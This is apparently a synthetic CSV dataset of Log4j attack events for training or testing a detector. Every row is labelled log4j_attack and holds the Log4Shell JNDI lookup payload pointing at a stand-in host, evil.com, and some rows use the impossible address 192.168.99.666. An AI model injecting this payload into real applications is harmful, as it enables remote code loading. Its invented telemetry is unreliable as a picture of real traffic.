timestamp,src_ip,dst_ip,process_name,file_hash,signature_status,outbound_conn_5min,dns_query,log_line,jndi_present,entropy,label
2025-11-28T06:19:56.015761,192.168.1.62,185.199.108.33,java.exe,3c01aad875c2f8e2eaac14a80fb5f65fcfbeab45a5cd142fad8643b8da9f09d2,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.133,log4j_attack
2025-11-28T06:19:56.015777,192.168.1.170,185.199.108.33,java.exe,1c95ca137c755c7190a4a143674309fa2604d39d915b5a35cfc298d06f989956,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.309,log4j_attack
2025-11-28T06:19:56.015793,192.168.1.47,104.21.45.67,java.exe,0651eccd407f5e66143f18146641dc16fca3d63a9d3ad86e1e252973f9b4bee0,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.92,log4j_attack
2025-11-28T06:19:56.015809,192.168.1.115,192.168.99.666,java.exe,e817a493ec3cfde2cfd89d71250f35c2dd7f9286d9b704870ad13c1ea0a6c419,Valid,45,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.867,log4j_attack
2025-11-28T06:19:56.015825,192.168.1.43,45.32.123.99,java.exe,ef11e6aa5ba74a03464da09c3b3ad9ec9af12d1eb43bb890eaa9af5a227a5c81,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.853,log4j_attack
2025-11-28T06:19:56.015841,192.168.1.102,185.45.67.88,java.exe,dc8920e0c4f52f9e9bd84cd3e1e170ee0124b7ceed627c47a6b4b85f1e0da18d,Valid,37,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.95,log4j_attack
2025-11-28T06:19:56.015857,192.168.1.22,185.199.108.33,java.exe,88ccbca47561f722520cda151d51c8c4b34a65a8bcaffdc158b4ef2d05d6e21a,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.167,log4j_attack
2025-11-28T06:19:56.015873,192.168.1.246,185.45.67.88,java.exe,79b1f9a741e3ccdf83b804c05901344b5e6dfcba5b6196b83ace18d02c1ca5a1,Valid,24,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.242,log4j_attack
2025-11-28T06:19:56.015901,192.168.1.121,185.45.67.88,java.exe,c6b7ea214db25ef64a72252e46d93af0e4ec2b44664647785dbd5d9225c34000,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.296,log4j_attack
2025-11-28T06:19:56.015919,192.168.1.104,192.168.99.666,java.exe,537481d9b0c59a7f13caf880de226a6e238c8b06e47f2e776973c0e03a9a0783,Valid,39,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.335,log4j_attack
2025-11-28T06:19:56.015935,192.168.1.237,185.45.67.88,java.exe,43d03c520953a1ac90dd7ad36340697ca6564f3bee66e82427b01bf527d3709c,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.218,log4j_attack
2025-11-28T06:19:56.015952,192.168.1.159,45.32.123.99,java.exe,2a1f519024a707b1628fcfaffd23ff7522b904ae64550ed5f8f9f092e0ea6890,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.24,log4j_attack
2025-11-28T06:19:56.015968,192.168.1.134,185.45.67.88,java.exe,c32d4601a412a4b60fbdabd72b71c53a46fd4595b75d17f6476a9f8d4cf35f22,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.094,log4j_attack
2025-11-28T06:19:56.015983,192.168.1.41,45.32.123.99,java.exe,d478563b0c9aef1873db7af98fc5b48a4c329f7d876c01d4d22c0de7d962bb70,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.361,log4j_attack
2025-11-28T06:19:56.016000,192.168.1.180,185.199.108.33,java.exe,771f1510f54774632151d49013dd5666707d41c5fd3a8cde47c9ffccd28d712a,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.008,log4j_attack
2025-11-28T06:19:56.016016,192.168.1.222,185.199.108.33,java.exe,5105aea8d8efaa806bd85ec4f6213528b737b8de1810b3522932ae0525d74aa8,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.477,log4j_attack
2025-11-28T06:19:56.016032,192.168.1.96,45.32.123.99,java.exe,c05bdd29fe0d68523ab05709e56ef5e7a092679126910915b6736888b7cb452e,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.032,log4j_attack
2025-11-28T06:19:56.016047,192.168.1.64,192.168.99.666,java.exe,079fce752a5cdb01539440f3761d85861ae473c1bb05db9c8f1bb1c49e0f534b,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.199,log4j_attack
2025-11-28T06:19:56.016063,192.168.1.129,192.168.99.666,java.exe,b96ef35b42eca35147bdca0f4fee6316b1425365b80a607647822777d3d4b3e7,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.943,log4j_attack
2025-11-28T06:19:56.016080,192.168.1.191,45.32.123.99,java.exe,ebc69eb5c3162c095e1042b8265eb72b3a086481726c24142d8c3150ca742e5c,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.285,log4j_attack
2025-11-28T06:19:56.016096,192.168.1.77,45.32.123.99,java.exe,4b48fc1370d87b833fcc66d84d909893d373fd3cf7c2c555ad4901598b2cc553,Valid,39,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.246,log4j_attack
2025-11-28T06:19:56.016112,192.168.1.90,104.21.45.67,java.exe,214f59ff1f76cad675d6ac2cc716e00a1a45261612ee3113c2a054bd71cbd5a9,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.193,log4j_attack
2025-11-28T06:19:56.016127,192.168.1.146,104.21.45.67,java.exe,9351de6e05995e7129ad402c8c4c6f9aa124b396545268eaaf2741260165669e,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.855,log4j_attack
2025-11-28T06:19:56.016143,192.168.1.119,104.21.45.67,java.exe,6fa6172cb1b655a7cba07a69318148475322a7a3ebc7b4d3b2f00a69ef14526b,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.493,log4j_attack
2025-11-28T06:19:56.016158,192.168.1.190,104.21.45.67,java.exe,495900703a4c605c52686d23dd553904bd5dba73045e3739682d7b68d37e0388,Valid,78,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.223,log4j_attack
2025-11-28T06:19:56.016174,192.168.1.130,185.45.67.88,java.exe,e3f83212726c52f9849badecdba6593a490c249987a39bf053680846f5b11bb5,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.338,log4j_attack
2025-11-28T06:19:56.016189,192.168.1.155,45.32.123.99,java.exe,4de0269950d6c7c52d8e6d637e23869e6ad68bbbfe0d8d7c5365cd3a5bd9f73f,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.319,log4j_attack
2025-11-28T06:19:56.016204,192.168.1.123,192.168.99.666,java.exe,a9db9bfa71ed259da0d7402f635ed9308b6ea3e15adc4a07ab5a5a269dfd9952,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.199,log4j_attack
2025-11-28T06:19:56.016220,192.168.1.188,104.21.45.67,java.exe,728eb5191275ff700f632658fe13e26a742785528c0864e966224825013c16ef,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.832,log4j_attack
2025-11-28T06:19:56.016235,192.168.1.141,45.32.123.99,java.exe,f9a2205954c564e84a856aa6975957a074868364a3ca1fe009995cb782c03e75,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.154,log4j_attack
2025-11-28T06:19:56.016251,192.168.1.65,104.21.45.67,java.exe,de6140f52d5db1c8fc61b59e5b8baffd57b9eabe6d8e827447bdc0a95b549eed,Valid,80,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.162,log4j_attack
2025-11-28T06:19:56.016267,192.168.1.110,185.45.67.88,java.exe,d273d0bced2c695da1361aa68b97551b3f13280965cab51782e712ef3644c669,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.484,log4j_attack
2025-11-28T06:19:56.016282,192.168.1.196,185.199.108.33,java.exe,12130edb5ceb6d01f2729f596d5ea142978f5963da9fb96721cc67058b3991ca,Valid,64,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.007,log4j_attack
2025-11-28T06:19:56.016297,192.168.1.175,192.168.99.666,java.exe,11d0756d65b5ab137e68cd3001d2b15406aa75f1d82eab8b5b9ae92b917290df,Valid,21,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.839,log4j_attack
2025-11-28T06:19:56.016313,192.168.1.196,104.21.45.67,java.exe,ec5ab903928a69d7580fa3a6ea2f76683dbf751dabd5554c0aff740eb6d68367,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.172,log4j_attack
2025-11-28T06:19:56.016328,192.168.1.35,45.32.123.99,java.exe,2e12cb83cde66e862ec193fc8553116008aac1aee37cf24ca796a79d8ac999ee,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.011,log4j_attack
2025-11-28T06:19:56.016351,192.168.1.61,45.32.123.99,java.exe,01d9dcbf43c2b3caaf288b74363339a3a40e02587e62319aafbcecdc070a7ced,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.085,log4j_attack
2025-11-28T06:19:56.016366,192.168.1.188,192.168.99.666,java.exe,7eb74198b1b58d586e6eb3ecfd9915ef02465ec2ed66e406a2ce953369ab0d44,Valid,30,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.832,log4j_attack
2025-11-28T06:19:56.016382,192.168.1.73,185.199.108.33,java.exe,d137c16d885fecb1da3042522a8a6c78e323a0689afb12e2edebc488ac553fc5,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.251,log4j_attack
2025-11-28T06:19:56.016408,192.168.1.31,45.32.123.99,java.exe,e3a0571e7ed76d60f82c3cc06bdc78520d3b2eb69b0f1d7db26d9a2c8bdbb5f7,Valid,72,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.431,log4j_attack
2025-11-28T06:19:56.016429,192.168.1.125,192.168.99.666,java.exe,cf658466605caf9f11717bb880647c1989eb3c9f49a9e93c981898d147cfa4e2,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.933,log4j_attack
2025-11-28T06:19:56.016445,192.168.1.51,45.32.123.99,java.exe,435cc4a09913d2e5cc4d1c6fd6bba0e9c65a9cff8e1bb124c97f966813060801,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.299,log4j_attack
2025-11-28T06:19:56.016461,192.168.1.196,185.45.67.88,java.exe,b64d8eaea00eae4e778a061596bc08b83edc41136530b3272381cb03bad83bec,Valid,73,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.822,log4j_attack
2025-11-28T06:19:56.016477,192.168.1.194,185.199.108.33,java.exe,88f5e8e990f85c31656341145382d46cc53d136b177dda4f053769ba6642738b,Valid,21,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.088,log4j_attack
2025-11-28T06:19:56.016493,192.168.1.249,185.45.67.88,java.exe,6dcc1dbf85b75ae790dfc6cb2d5c6832d26261854ff50c26e8d41aeb4d450480,Valid,59,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.988,log4j_attack
2025-11-28T06:19:56.016509,192.168.1.53,104.21.45.67,java.exe,682fd65722e2165fd4a9a24ee788bfebbe4f236549e25e4f62634a72f9936171,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.281,log4j_attack
2025-11-28T06:19:56.016525,192.168.1.201,45.32.123.99,java.exe,208859c2e0662e698c4f38a0ca5d26a8c39069b033c36e94ea6055e33183553b,Valid,43,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.215,log4j_attack
2025-11-28T06:19:56.016540,192.168.1.108,185.45.67.88,java.exe,2a64a39e8a6a32623fe4c6c1b6cde139cbeab12ac2320d3c7f9155a6da92d380,Valid,63,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.494,log4j_attack
2025-11-28T06:19:56.016556,192.168.1.88,185.199.108.33,java.exe,44389e71c5af921d9d90ff1e67e185801c0aaf37f0035b414ba20df308dbb5ff,Valid,66,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.312,log4j_attack
2025-11-28T06:19:56.016573,192.168.1.234,192.168.99.666,java.exe,370e59de634fc920e09412e7a0ae80f0f248d86bc24bfa7f4ef0410624f9f30b,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.306,log4j_attack
2025-11-28T06:19:56.016589,192.168.1.87,192.168.99.666,java.exe,2b7ebc8d5c46898e034fa70d3ec957fe94aba03b8c9821ab9b06e60e457d0f38,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.155,log4j_attack
2025-11-28T06:19:56.016605,192.168.1.133,185.199.108.33,java.exe,c7f6a02df7c8367cd278a7ac65cdf92fbfe3d6b8c15205dbb37546ebb1c5aeeb,Valid,22,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.022,log4j_attack
2025-11-28T06:19:56.016621,192.168.1.194,192.168.99.666,java.exe,164121c0d1f5fdbeec292ecc53ae4cd9133fd35cf7df5b59b4f1d49c3f832d2c,Valid,48,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.347,log4j_attack
2025-11-28T06:19:56.016637,192.168.1.100,185.45.67.88,java.exe,cc103a5e09cc765639b1e9ae7123f91aaca2933bdff429762b4a1ec82292dd4d,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.028,log4j_attack
2025-11-28T06:19:56.016653,192.168.1.189,185.45.67.88,java.exe,42f27474e449f3ee0f384e1a7a8107f5615f655503d4a5b89bab1fb0fb574c3d,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.992,log4j_attack
2025-11-28T06:19:56.016669,192.168.1.33,45.32.123.99,java.exe,ab61cd96e56bf45be9fc721db501249b34b968ce2f90c8a6c0ad946458d7b24c,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.823,log4j_attack
2025-11-28T06:19:56.016687,192.168.1.94,185.45.67.88,java.exe,e2ac537626015dbe637e43454f3dcac40ae6ab8735cc78df120ef9fffd39c3e5,Valid,55,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.347,log4j_attack
2025-11-28T06:19:56.016702,192.168.1.47,185.199.108.33,java.exe,00a82bc51091d230749994fd1fc4e2d41e50ce9dc909c886b49a0b2a66795bdd,Valid,28,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.173,log4j_attack
2025-11-28T06:19:56.016718,192.168.1.154,192.168.99.666,java.exe,4d9963074633744f2af8d64019a2c67867b2281cc15b9ad48127b9646ca9a074,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.121,log4j_attack
2025-11-28T06:19:56.016734,192.168.1.45,185.199.108.33,java.exe,b0c7b314b3e242f88e6fdb9080b0bfd19f0b76bcf8cd82518d704093954658fa,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.897,log4j_attack
2025-11-28T06:19:56.016751,192.168.1.145,185.45.67.88,java.exe,51e4f78e29c5be0bf51554eb57b389729de344ff337d6d8981242f053b3ddd47,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.028,log4j_attack
2025-11-28T06:19:56.016767,192.168.1.133,185.45.67.88,java.exe,3fa4b52277e83f478a967ce266364b9532e875bd2bf6437b0c0e3131b2dceb00,Valid,63,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.831,log4j_attack
2025-11-28T06:19:56.016783,192.168.1.236,45.32.123.99,java.exe,a8ebc0a5b7e016ea4032e75e3d1922046448562784fce9d2157c4cc9562f8ef0,Valid,39,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.464,log4j_attack
2025-11-28T06:19:56.016799,192.168.1.59,45.32.123.99,java.exe,c33bf6517be0a0703ae124940302e6ea892ea3703a7810e469c232e75620fe40,Valid,51,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.964,log4j_attack
2025-11-28T06:19:56.016820,192.168.1.239,185.199.108.33,java.exe,050baa09242f184e41ec8d73446d83ac9a5a3f84a0f79545213bd0cbf6d2739f,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.145,log4j_attack
2025-11-28T06:19:56.016836,192.168.1.12,104.21.45.67,java.exe,3efdffd7800ae26f687c4303cf602cd5fe6328070dd5ede35cc3a88fdcc28a4f,Valid,67,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.269,log4j_attack
2025-11-28T06:19:56.016852,192.168.1.61,185.45.67.88,java.exe,4d8133a9df425dec0bc214aae792ae8c3353ca4f8dbcdf6ca713b4173eeedb16,Valid,55,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.104,log4j_attack
2025-11-28T06:19:56.016867,192.168.1.221,192.168.99.666,java.exe,4f81482b72d680a9054823a74f672d753d6a0335a7d6bc7ac599a4b55adc0ec9,Valid,45,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.92,log4j_attack
2025-11-28T06:19:56.016883,192.168.1.229,185.199.108.33,java.exe,527f983f61f5b5eb7c87a263ebb581501a1e3427d045fd92214882f1178625e2,Valid,26,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.804,log4j_attack
2025-11-28T06:19:56.016912,192.168.1.157,192.168.99.666,java.exe,4feddfe7e5a28eac2a5bea72920b030559c9d68091fb3981e6bbbfc5cfef2ff0,Valid,47,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.407,log4j_attack
2025-11-28T06:19:56.016925,192.168.1.184,45.32.123.99,java.exe,38e5a266970e92711051eea38645bf1fcc439edf45e7f4e731ca2214c0f352a6,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.401,log4j_attack
2025-11-28T06:19:56.016941,192.168.1.38,104.21.45.67,java.exe,505e6bcf7becfcb2d958c096067dcf702f15123322536bd29a7bab62034fbc2b,Valid,43,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.97,log4j_attack
2025-11-28T06:19:56.016957,192.168.1.80,45.32.123.99,java.exe,5bcc835caec7a392cfb2ee1c8057c7cfa77410e0d986b5f592a148ddbcbb9441,Valid,64,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.066,log4j_attack
2025-11-28T06:19:56.016984,192.168.1.28,45.32.123.99,java.exe,0c4cfdb4ae935cebe040d7ed61e1ae12013c5770f84f75c3b171e4c759321872,Valid,76,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.152,log4j_attack
2025-11-28T06:19:56.017000,192.168.1.114,185.45.67.88,java.exe,50147946c41131be1585ac2d32b136b27f527758fe723017346809f59b3e0c2d,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.337,log4j_attack
2025-11-28T06:19:56.017016,192.168.1.23,185.199.108.33,java.exe,c55c59cdc0e2639a6b0cc704cf174dba281fd8b72568635e608fbaabef2ed632,Valid,20,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.832,log4j_attack
2025-11-28T06:19:56.017031,192.168.1.141,45.32.123.99,java.exe,286a700ef7d3a70b35da0f4d99a705a7da84f22b8007262f0c941ba3635ae366,Valid,56,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.083,log4j_attack
2025-11-28T06:19:56.017048,192.168.1.232,104.21.45.67,java.exe,95618f675b474853ead6efd452e81bb2ec37692e1638ca6ae3b83c3ed799ec4d,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.314,log4j_attack
2025-11-28T06:19:56.017064,192.168.1.222,185.45.67.88,java.exe,5c9a57e0b6b59d68d5514afddac49ea0f3e10440bf91db672a37c2f02fa25baa,Valid,31,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.911,log4j_attack
2025-11-28T06:19:56.017080,192.168.1.77,45.32.123.99,java.exe,1e2a074c2a2d586db600103dfe1c247c5c56c7a5327989144eadc537f80bcd05,Valid,52,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.492,log4j_attack
2025-11-28T06:19:56.017095,192.168.1.63,104.21.45.67,java.exe,54023e52d6582dce62868f235d68ffdf75d0b35d7c2a93bca7ea07dfb71dd772,Valid,41,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.052,log4j_attack
2025-11-28T06:19:56.017111,192.168.1.12,185.45.67.88,java.exe,6aad92f0b7876414ac71e63071fbe0a68126bf2ec0619e960ead29ea654e5453,Valid,37,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.162,log4j_attack
2025-11-28T06:19:56.017126,192.168.1.161,45.32.123.99,java.exe,05d8b5689c6cbaa74b9c1db7181b52346f25f5bdc6b0265fc91679a73e0c9552,Valid,60,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.466,log4j_attack
2025-11-28T06:19:56.017141,192.168.1.214,104.21.45.67,java.exe,9a47fe6d2bfd9855ba524dbf26bfdef872940e95d5bebdc357bb2646bb91abc0,Valid,27,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.49,log4j_attack
2025-11-28T06:19:56.017157,192.168.1.75,185.199.108.33,java.exe,1d7c4af41682bd6c23f069a76bb74431b07fddfa7d71926f6e8ac161016282d5,Valid,29,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.301,log4j_attack
2025-11-28T06:19:56.017173,192.168.1.233,45.32.123.99,java.exe,a381598bd84d19c37cc48b7da3b8fe1f7d638b6604c21e15c5e445141bce2460,Valid,23,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.176,log4j_attack
2025-11-28T06:19:56.017188,192.168.1.102,45.32.123.99,java.exe,2479ac6ffd20fd6536579c6e1bc42a671ed0bda50b10df1c55f72ec010e8be05,Valid,39,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.124,log4j_attack
2025-11-28T06:19:56.017204,192.168.1.173,192.168.99.666,java.exe,50620c6be6efb3df7bc3cd713b6f966080ab8d2ec5b6da5611aed3e133861ba2,Valid,75,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.224,log4j_attack
2025-11-28T06:19:56.017220,192.168.1.111,185.199.108.33,java.exe,a7f7766655012c6dd22a89dcae4edad965c0b9326fbe67064037c8920475c2b6,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.387,log4j_attack
2025-11-28T06:19:56.017236,192.168.1.194,185.199.108.33,java.exe,a522b9db0036fda07576701f198ef5ef039a7fd58e77c001f07eadabd0cc13e3,Valid,68,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.958,log4j_attack
2025-11-28T06:19:56.017252,192.168.1.211,185.199.108.33,java.exe,667e6f1072fa188f51580609ead0e95bdd55112ab66f2b344244cd20e66e8c1f,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.193,log4j_attack
2025-11-28T06:19:56.017269,192.168.1.173,185.199.108.33,java.exe,8ba5508ae8ea2ab60321bcd2cc8eb0db6e6a207fad9315ad8b7543123a18494f,Valid,34,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.201,log4j_attack
2025-11-28T06:19:56.017285,192.168.1.183,104.21.45.67,java.exe,e6877b3b63c6df50117315e224e32d2c8f7ba3145969a2c0268269bc1f7f3e9a,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.952,log4j_attack
2025-11-28T06:19:56.017300,192.168.1.231,45.32.123.99,java.exe,6670acfca4effc5205d972e15d9fbd8d9a9983dee6eff7d606027af03ec1c9d9,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.107,log4j_attack
2025-11-28T06:19:56.017317,192.168.1.23,104.21.45.67,java.exe,7c29213b1dfc038bc87c61d61ef51025d8c67908478b28032ec1e5d024b628ab,Valid,33,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.375,log4j_attack
2025-11-28T06:19:56.017332,192.168.1.173,192.168.99.666,java.exe,b4148fd494fd34edd240c33c960d10a22ed66d972b506df23ad43e3dece0b056,Valid,58,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.341,log4j_attack
2025-11-28T06:19:56.017355,192.168.1.79,192.168.99.666,java.exe,648c1b5b011640a0fa3101b5768d2dae0501ee230f8d64da302ba3463bc326e9,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.426,log4j_attack
2025-11-28T06:19:56.017370,192.168.1.55,45.32.123.99,java.exe,38fc9aa6dcaafc8f29f84dca88ede2c89d098d949566ac931213de2c5c4ae6e0,Valid,71,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.386,log4j_attack
2025-11-28T06:19:56.017386,192.168.1.221,192.168.99.666,java.exe,006719c1f0eab0b451c7350fedeccaad1888bb16a9b0bdff270a170a0d8a4074,Valid,46,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.819,log4j_attack
2025-11-28T06:19:56.017401,192.168.1.13,104.21.45.67,java.exe,24a64ad75ffbe2b153ba512ff80025c5d1b51a9126c921de7330527ce4f5124a,Valid,38,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.123,log4j_attack
2025-11-28T06:19:56.017418,192.168.1.162,45.32.123.99,java.exe,c87213a064f883180255bcb15f865ba2886b2f5ce8ad896e8f029855dc9585d9,Valid,37,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.995,log4j_attack
2025-11-28T06:19:56.017433,192.168.1.60,185.45.67.88,java.exe,97308c63c1330fe2307549da8ec301c7ef79d934fab680ff48a774da647ecb8a,Valid,35,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.94,log4j_attack
2025-11-28T06:19:56.017449,192.168.1.71,192.168.99.666,java.exe,e8d0fdca2d3210a23bbbcbc630bedf7013b01d5777f2991401d0e4b373eff03c,Valid,59,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.058,log4j_attack
2025-11-28T06:19:56.017465,192.168.1.214,192.168.99.666,java.exe,46c751144b9cdc4090e8343c2c528ba99503f99af5b2c42c2560d394973ecf94,Valid,74,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.887,log4j_attack
2025-11-28T06:19:56.017480,192.168.1.19,45.32.123.99,java.exe,f252e954c7c9e98402a038fab5aa0da654e5bd79c44373a60a22c702802a9a8c,Valid,69,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.093,log4j_attack
2025-11-28T06:19:56.017496,192.168.1.97,185.199.108.33,java.exe,6a99b19507bd6b5fe474a27a242111494640dd6ad629cfbe1c5fb8f45aa806a4,Valid,50,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.078,log4j_attack
2025-11-28T06:19:56.017511,192.168.1.200,185.199.108.33,java.exe,b99f8e327b939346ca0818b524824f36f57ce8ddeaea3149d95479c4a05ce925,Valid,73,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,7.302,log4j_attack
2025-11-28T06:19:56.017527,192.168.1.139,104.21.45.67,java.exe,fcb2fbf0c7901a2da501d43533941730cfbcd586f5c8948deaf5349e1e710f72,Valid,30,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.972,log4j_attack
2025-11-28T06:19:56.017542,192.168.1.19,185.199.108.33,java.exe,d4a7f19fa0b262a0c121439d5369b5f7c1805f4b6a0fbd23e45684de712c0e2a,Valid,79,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.997,log4j_attack
2025-11-28T06:19:56.017557,192.168.1.60,104.21.45.67,java.exe,4491b467ff88b10d0fa809cc829209ebdcd3548169d9f80a7c4549fe7476b70d,Valid,40,log4j.exploit.lab,${jndi:ldap://evil.com/a},1,6.849,log4j_attack
